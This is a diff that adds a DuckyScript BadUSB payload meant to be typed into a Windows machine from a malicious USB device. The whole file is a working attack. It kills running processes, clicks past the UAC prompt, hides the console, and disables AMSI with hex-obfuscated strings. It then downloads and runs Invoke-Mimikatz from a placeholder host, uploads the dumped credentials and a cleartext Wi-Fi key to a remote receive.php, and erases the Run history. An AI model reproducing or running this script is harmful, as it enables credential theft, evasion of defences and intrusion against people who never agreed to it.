@@ -1,0 +1,56 @@
+REM Title: Invoke mimikatz and send creds to local or remote server(Updated)
+REM Author: RosePwns
+
+
+REM Payload Start 
+DELAY 2500
+REM Short 2.5 second delay for bad-usb to setup
+GUI r
+REM Shortcut to open windows run search bar
+DELAY 800
+STRING cmd 
+ENTER
+REM Open CMD
+DELAY 800
+STRING powershell -command "(New-Object -comObject Shell.Application).Windows() | foreach-object {$_.quit()}; Get-Process | Where-Object {$_.MainWindowTitle -ne \"\"} | stop-process"
+ENTER
+REM Kill all open processes on the machine. Note: Needed to 
+STRING exit 
+ENTER
+GUI r
+DELAY 1000
+STRING powershell Start-Process powershell -Verb runAs
+REM Run powershell as Administrator
+DELAY 500
+ENTER
+DELAY 800
+ALT TAB
+REM Select UAC window once it pops up
+DELAY 800
+ALT y
+REM Bypass UAC window
+DELAY 800
+STRING mode con:cols=18 lines=1
+ENTER
+STRING color FE
+ENTER
+REM Obfuscate the command prompt
+STRING [Ref].Assembly.GetType('System.Management.Automation.'+$("41 6D 73 69 55 74 69 6C 73".Split(" ")|forEach{[char]([convert]::toint16($_,16))}|forEach{$result=$result+$_};$result)).GetField($("61 6D 73 69 49 6E 69 74 46 61 69 6C 65 64".Split(" ")|forEach{[char]([convert]::toint16($_,16))}|forEach{$result2=$result2+$_};$result2),'NonPublic,Static').SetValue($null,$true)
+ENTER
+DELAY 800
+REM Bypass AMSI
+STRING IEX (New-Object Net.WebClient).DownloadString('http://DOMAIN/MimikatzClone.ps1'); $output = Invoke-Mimikatz; (New-Object Net.WebClient).UploadString('http://DOMAIN:8000/receive.php', $output)
+REM Download and execute Invoke Mimikatz then upload the results
+ENTER
+DELAY 30000
+ENTER
+STRING $output1 = netsh wlan show profile name="Network_Name" key=clear; (New-Object Net.WebClient).UploadString('http://DOMAIN:8000/receive.php', $output1)
+ENTER
+DELAY 500
+REM Steal wifi password if you have the SSID
+STRING Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU' -Name '*' -ErrorAction SilentlyContinue
+ENTER
+STRING exit
+ENTER
+REM Clear the Run history and exit
+REM End Payload
